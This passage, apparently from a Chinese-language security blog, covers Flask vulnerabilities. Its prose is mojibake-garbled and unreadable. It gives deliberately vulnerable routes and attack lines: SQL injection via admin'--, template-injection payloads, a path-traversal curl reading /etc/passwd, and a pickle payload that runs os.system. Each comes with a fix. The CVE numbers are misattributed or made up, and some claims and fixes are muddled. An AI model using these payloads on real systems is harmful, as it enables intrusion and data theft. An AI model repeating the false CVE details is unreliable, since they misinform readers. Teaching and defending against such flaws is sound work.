class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´-RCE"><a href="#è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´-RCE" class="headerlink" title="è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (RCE)"></a>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (RCE)</h3><p>æ¨¡æ¿æ³¨å…¥æ¼æ´ä¼šå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿæ³¨å…¥æ¶æ„æ¨¡æ¿ä»£ç ï¼Œæ‰§è¡Œä»»æ„æœåŠ¡å™¨ç«¯çš„ Python ä»£ç ã€‚</p><p><strong>æ˜“å—æ”»å‡»ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/template&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;template&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(user_input)<br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»æ–¹å¼</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h3><p>ååºåˆ—åŒ–æ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºä¸å®‰å…¨åœ°ååºåˆ—åŒ–ç”¨æˆ·æä¾›çš„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p><strong>æ˜“å—æ”»å‡»ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/load_data&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>():<br>    data = request.data<br>    obj = pickle.loads(data)<br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure><hr><h2 id="Flask-æ¼æ´åˆ©ç”¨æ–¹æ³•"><a href="#Flask-æ¼æ´åˆ©ç”¨æ–¹æ³•" class="headerlink" title="Flask æ¼æ´åˆ©ç”¨æ–¹æ³•"></a>Flask æ¼æ´åˆ©ç”¨æ–¹æ³•</h2><h3 id="SQL-æ³¨å…¥æ”»å‡»"><a href="#SQL-æ³¨å…¥æ”»å‡»" class="headerlink" title="SQL æ³¨å…¥æ”»å‡»"></a>SQL æ³¨å…¥æ”»å‡»</h3><p>é€šè¿‡æäº¤æ¶æ„çš„ SQL è¯­å¥ï¼Œæ”»å‡»è€…å¯ä»¥æ“çºµ SQL æŸ¥è¯¢çš„æ‰§è¡Œã€‚</p><p><strong>æ”»å‡»æ–¹å¼</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/user?username=admin&#x27;--&quot;</span><br></code></pre></td></tr></table></figure><h3 id="è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»"><a href="#è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»" class="headerlink" title="è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»"></a>è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»</h3><p>é€šè¿‡ä¼ é€’æ¶æ„çš„ Jinja2 æ¨¡æ¿è¡¨è¾¾å¼ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p><strong>æ”»å‡»æ–¹å¼</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="è·¯å¾„éå†æ”»å‡»"><a href="#è·¯å¾„éå†æ”»å‡»" class="headerlink" title="è·¯å¾„éå†æ”»å‡»"></a>è·¯å¾„éå†æ”»å‡»</h3><p>æ„é€ æ¶æ„æ–‡ä»¶è·¯å¾„ï¼Œè¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚</p><p><strong>æ”»å‡»æ–¹å¼</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–æ”»å‡»"><a href="#ååºåˆ—åŒ–æ”»å‡»" class="headerlink" title="ååºåˆ—åŒ–æ”»å‡»"></a>ååºåˆ—åŒ–æ”»å‡»</h3><p>é€šè¿‡å‘é€æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶åº”ç”¨ç¨‹åºæ‰§è¡Œä»»æ„æ“ä½œã€‚</p><hr></li></ul><h2 id="CVE-2019-1010083-Flask-Security-SQL-æ³¨å…¥æ¼æ´"><a href="#CVE-2019-1010083-Flask-Security-SQL-æ³¨å…¥æ¼æ´" class="headerlink" title="CVE-2019-1010083 - Flask-Security SQL æ³¨å…¥æ¼æ´"></a>CVE-2019-1010083 - Flask-Security SQL æ³¨å…¥æ¼æ´</h2><h3 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p><strong>CVE-2019-1010083</strong> æ˜¯ Flask-Security æ’ä»¶ä¸­çš„ SQL æ³¨å…¥æ¼æ´ã€‚Flask-Security æ˜¯ç”¨äºå¿«é€Ÿé›†æˆç”¨æˆ·èº«ä»½è®¤è¯å’Œæƒé™ç®¡ç†çš„æ’ä»¶ã€‚è¿™ä¸ªæ¼æ´å‡ºç°åœ¨ Flask-Security ä¸­ï¼Œåœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…èƒ½å¤Ÿæ„é€ æ¶æ„ SQL æŸ¥è¯¢ï¼Œæ’å…¥åˆ°åº”ç”¨ç¨‹åºçš„æŸ¥è¯¢è¯­å¥ä¸­ï¼Œè¿›è€Œæ‰§è¡Œä»»æ„ SQL æ“ä½œã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šå‚æ•°è¿›è¡Œ SQL æ³¨å…¥æ“ä½œï¼Œç»•è¿‡èº«ä»½éªŒè¯æˆ–æå–æ•æ„Ÿæ•°æ®ã€‚</p><h4 id="ç¤ºä¾‹ä»£ç ï¼š"><a href="#ç¤ºä¾‹ä»£ç ï¼š" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><p>å‡è®¾åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨äº† Flask-Security è¿›è¡Œç”¨æˆ·èº«ä»½è®¤è¯ï¼Œæ¼æ´å¯èƒ½å‡ºç°åœ¨ä»¥ä¸‹ä»£ç ç‰‡æ®µä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> sqlite3<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    query = <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">&#123;password&#125;</span>&#x27;&quot;</span><br>    conn = sqlite3.connect(<span class="hljs-string">&#x27;example.db&#x27;</span>)<br>    result = conn.execute(query)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result.fetchall())<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨æ–¹æ³•ï¼š"><a href="#åˆ©ç”¨æ–¹æ³•ï¼š" class="headerlink" title="åˆ©ç”¨æ–¹æ³•ï¼š"></a>åˆ©ç”¨æ–¹æ³•ï¼š</h4><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤æ¶æ„è¡¨å•ï¼Œæ„é€ è¾“å…¥æ¥ç»•è¿‡èº«ä»½éªŒè¯æˆ–æŸ¥è¯¢å…¶ä»–ç”¨æˆ·ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&quot;username=admin&#x27;--&amp;password=&quot;</span> http://localhost:5000/login<br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»åŸç†</strong>ï¼š</p><ol><li><code>username</code> å‚æ•°é€šè¿‡ç”¨æˆ·è¾“å…¥çš„æ–¹å¼ä¼ é€’ï¼Œæœªç»ä»»ä½•è¿‡æ»¤å’Œè½¬ä¹‰ç›´æ¥æ’å…¥ SQL æŸ¥è¯¢ã€‚</li><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€  <code>username=admin&#39;--</code>ï¼Œæ³¨é‡Šæ‰åé¢çš„ <code>password</code> æŸ¥è¯¢éƒ¨åˆ†ï¼Œå®ç° SQL æ³¨å…¥ã€‚</li></ol><p><strong>è§£å†³æ–¹æ³•</strong>ï¼š<br>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–è€… ORM å·¥å…·ï¼Œé¿å…ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥åˆ° SQL æŸ¥è¯¢ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢é˜²æ­¢ SQL æ³¨å…¥</span><br>query = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span><br>result = conn.execute(query, (username, password))<br></code></pre></td></tr></table></figure><hr><h2 id="CVE-2019-1010084-Flask-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´-RCE"><a href="#CVE-2019-1010084-Flask-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´-RCE" class="headerlink" title="CVE-2019-1010084 - Flask è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (RCE)"></a>CVE-2019-1010084 - Flask è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (RCE)</h2><h3 id="æ¼æ´æè¿°-1"><a href="#æ¼æ´æè¿°-1" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p><strong>CVE-2019-1010084</strong> æ˜¯ Flask ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ­¤æ¼æ´ä¸ Flask ä¸­ä¸å®‰å…¨åœ°ä½¿ç”¨ <code>render_template_string()</code> å‡½æ•°æœ‰å…³ã€‚<code>render_template_string()</code> ç”¨äºåŠ¨æ€æ¸²æŸ“æ¨¡æ¿ï¼Œä½†å¦‚æœæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„æ¨¡æ¿ä»£ç ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><h3 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ”»å‡»è€…å¯ä»¥å‘åº”ç”¨ç¨‹åºä¼ é€’æ¶æ„çš„ Jinja2 æ¨¡æ¿è¡¨è¾¾å¼ï¼Œåˆ©ç”¨ Flask çš„æ¨¡æ¿å¼•æ“æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h4 id="ç¤ºä¾‹ä»£ç ï¼š-1"><a href="#ç¤ºä¾‹ä»£ç ï¼š-1" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/template&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;template&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(user_input)<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨æ–¹æ³•ï¼š-1"><a href="#åˆ©ç”¨æ–¹æ³•ï¼š-1" class="headerlink" title="åˆ©ç”¨æ–¹æ³•ï¼š"></a>åˆ©ç”¨æ–¹æ³•ï¼š</h4><p>æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„æ¨¡æ¿è¡¨è¾¾å¼è¿›è¡Œæ”»å‡»ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¼šè¿”å› <code>49</code>ï¼Œè¯´æ˜æ¨¡æ¿è¡¨è¾¾å¼å·²ç»è¢«æˆåŠŸæ‰§è¡Œã€‚</p><h4 id="æ›´ä¸¥é‡çš„æ”»å‡»ï¼š"><a href="#æ›´ä¸¥é‡çš„æ”»å‡»ï¼š" class="headerlink" title="æ›´ä¸¥é‡çš„æ”»å‡»ï¼š"></a>æ›´ä¸¥é‡çš„æ”»å‡»ï¼š</h4><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¨¡æ¿æ³¨å…¥æ‰§è¡Œä»»æ„ Python ä»£ç ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;config.items()&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ol><li><code>render_template_string()</code> ä¸å®‰å…¨åœ°ç›´æ¥æ¸²æŸ“äº†ç”¨æˆ·æä¾›çš„å­—ç¬¦ä¸²ã€‚</li><li>æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„æ¨¡æ¿ä»£ç ï¼Œå€ŸåŠ© Jinja2 çš„æ¨¡æ¿è¡¨è¾¾å¼æ‰§è¡Œ Python ä»£ç ã€‚</li></ol><p><strong>è§£å†³æ–¹æ³•</strong>ï¼š</p><ol><li>é¿å…ç›´æ¥ä½¿ç”¨ <code>render_template_string</code> æ¸²æŸ“ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚</li><li>å¦‚æœå¿…é¡»ä½¿ç”¨åŠ¨æ€æ¸²æŸ“ï¼Œä½¿ç”¨ä¸¥æ ¼çš„è¿‡æ»¤æˆ–ä½¿ç”¨ <code>StrictUndefined</code> æ¨¡å¼ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, StrictUndefined<br><br>env = Environment(undefined=StrictUndefined)<br></code></pre></td></tr></table></figure><hr><h2 id="CVE-2018-1000656-Flask-ååºåˆ—åŒ–æ¼æ´"><a href="#CVE-2018-1000656-Flask-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="CVE-2018-1000656 - Flask ååºåˆ—åŒ–æ¼æ´"></a>CVE-2018-1000656 - Flask ååºåˆ—åŒ–æ¼æ´</h2><h3 id="æ¼æ´æè¿°-2"><a href="#æ¼æ´æè¿°-2" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p><strong>CVE-2018-1000656</strong> æ˜¯ Flask åº”ç”¨ä¸­çš„ååºåˆ—åŒ–æ¼æ´ã€‚ååºåˆ—åŒ–æ¼æ´é€šå¸¸å‘ç”Ÿåœ¨ä¸å®‰å…¨åœ°ååºåˆ—åŒ–ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨-2"><a href="#æ¼æ´åˆ©ç”¨-2" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>Flask åº”ç”¨é€šè¿‡ <code>pickle</code> æˆ–ç±»ä¼¼çš„ååºåˆ—åŒ–æœºåˆ¶åŠ è½½ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œä½¿å¾—åº”ç”¨æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h4 id="ç¤ºä¾‹ä»£ç ï¼š-2"><a href="#ç¤ºä¾‹ä»£ç ï¼š-2" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/load_data&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>():<br>    serialized_data = request.data<br>    data = pickle.loads(serialized_data)<br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨æ–¹æ³•ï¼š-2"><a href="#åˆ©ç”¨æ–¹æ³•ï¼š-2" class="headerlink" title="åˆ©ç”¨æ–¹æ³•ï¼š"></a>åˆ©ç”¨æ–¹æ³•ï¼š</h4><p>æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œå‘é€åˆ°æœåŠ¡å™¨ç«¯ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RCE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;ls&#x27;</span>,))<br><br>payload = pickle.dumps(RCE())<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>é€šè¿‡ POST è¯·æ±‚å‘é€æ¶æ„æ•°æ®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST --data-binary <span class="hljs-string">&quot;@payload.pickle&quot;</span> http://localhost:5000/load_data<br></code></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ol><li><code>pickle.loads</code> ç›´æ¥ååºåˆ—åŒ–ç”¨æˆ·æä¾›çš„æ•°æ®ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–å¯¹è±¡ã€‚</li><li><code>__reduce__</code> æ–¹æ³•è¢«ç”¨æ¥æŒ‡å®šå¦‚ä½•ååºåˆ—åŒ–å¯¹è±¡ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆå¦‚ <code>os.system(&#39;ls&#39;)</code>ï¼‰ã€‚</li></ol><p><strong>è§£å†³æ–¹æ³•</strong>ï¼š</p><ol><li>é¿å…ä½¿ç”¨ <code>pickle</code> ååºåˆ—åŒ–ä¸å—ä¿¡ä»»çš„ç”¨æˆ·æ•°æ®ã€‚</li><li>å¦‚æœéœ€è¦åºåˆ—åŒ–æ•°æ®ï¼Œå»ºè®®ä½¿ç”¨å®‰å…¨çš„åºåˆ—åŒ–æ ¼å¼ï¼Œå¦‚ <code>JSON</code>ã€‚</li></ol><hr><h2 id="CVE-2019-1010085-Flask-æ–‡ä»¶ä¸Šä¼ è·¯å¾„éå†æ¼æ´"><a href="#CVE-2019-1010085-Flask-æ–‡ä»¶ä¸Šä¼ è·¯å¾„éå†æ¼æ´" class="headerlink" title="CVE-2019-1010085 - Flask æ–‡ä»¶ä¸Šä¼ è·¯å¾„éå†æ¼æ´"></a>CVE-2019-1010085 - Flask æ–‡ä»¶ä¸Šä¼ è·¯å¾„éå†æ¼æ´</h2><h3 id="æ¼æ´æè¿°-3"><a href="#æ¼æ´æè¿°-3" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p><strong>CVE-2019-1010085</strong> æ˜¯ Flask æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¸­çš„è·¯å¾„éå†æ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„æ–‡ä»¶åï¼Œå¯ä»¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ï¼Œç”šè‡³æ‰§è¡Œæ–‡ä»¶è¦†ç›–ç­‰æ”»å‡»ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨-3"><a href="#æ¼æ´åˆ©ç”¨-3" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ–‡ä»¶æ—¶æ„é€ æ¶æ„è·¯å¾„ï¼Œåˆ©ç”¨è·¯å¾„éå†æ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ï¼Œç”šè‡³å¯èƒ½è¦†ç›–å…³é”®æ–‡ä»¶ã€‚</p><h4 id="ç¤ºä¾‹ä»£ç ï¼š-3"><a href="#ç¤ºä¾‹ä»£ç ï¼š-3" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, send_from_directory<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, filename)<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨æ–¹æ³•ï¼š-3"><a href="#åˆ©ç”¨æ–¹æ³•ï¼š-3" class="headerlink" title="åˆ©ç”¨æ–¹æ³•ï¼š"></a>åˆ©ç”¨æ–¹æ³•ï¼š</h4><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ–‡ä»¶åå‚æ•°æ„é€ è·¯å¾„éå†æ”»å‡»ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><p>æ­¤æ”»å‡»å°†è¯»å–æœåŠ¡å™¨ä¸Šçš„ <code>/etc/passwd</code> æ–‡ä»¶å†…å®¹ã€‚</p><p><strong>è§£é‡Š</strong>ï¼š</p><ol><li><code>send_from_directory(&#39;/uploads&#39;, filename)</code> å‡½æ•°ä¸­æ²¡æœ‰éªŒè¯ <code>filename</code> å‚æ•°ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ è·¯å¾„éå†ï¼ˆå¦‚ <code>../../</code>ï¼‰æ¥è¯»å–ä»»æ„æ–‡ä»¶ã€‚</li><li>é€šè¿‡ <code>..</code> æ¥è·³å‡º <code>/uploads</code> ç›®å½•ï¼Œè®¿é—®ç³»ç»Ÿæ–‡ä»¶ã€‚</li></ol><p><strong>è§£å†³æ–¹æ³•</strong>ï¼š<br>ä½¿ç”¨ <code>os.path.join</code> æˆ– <code>safe_join</code> æ¥ç¡®ä¿æ–‡ä»¶è·¯å¾„åœ¨æŒ‡å®šç›®å½•å†…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename, safe_join<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    safe_filename = secure_filename(filename)<br>    safe_path = safe_join(<span class="hljs-string">&#x27;/uploads&#x27;</span>, safe_filename)<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, safe_path)<br></code></pre></td></tr></table></figure><ul><li><code>secure_filename</code> å°†æ–‡ä»¶åå®‰å…¨åŒ–ï¼Œç§»é™¤ç‰¹æ®Šå­—ç¬¦å’Œå±é™©è·¯å¾„ã€‚</li><li><code>safe_join</code> ç¡®ä¿è·¯å¾„åœ¨ <code>/uploads</code> ç›®å½•ä¸‹ï¼Œé˜²æ­¢è·¯å¾„éå†æ”»å‡»ã€‚</li></ul><hr><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><ol><li><p><strong>SQL æ³¨å…¥</strong>ï¼šFlask ä¸­çš„ SQL æ³¨å…¥æ”»å‡»é€šå¸¸å‘ç”Ÿåœ¨æœªä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢çš„åœ°æ–¹ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„çš„ SQL 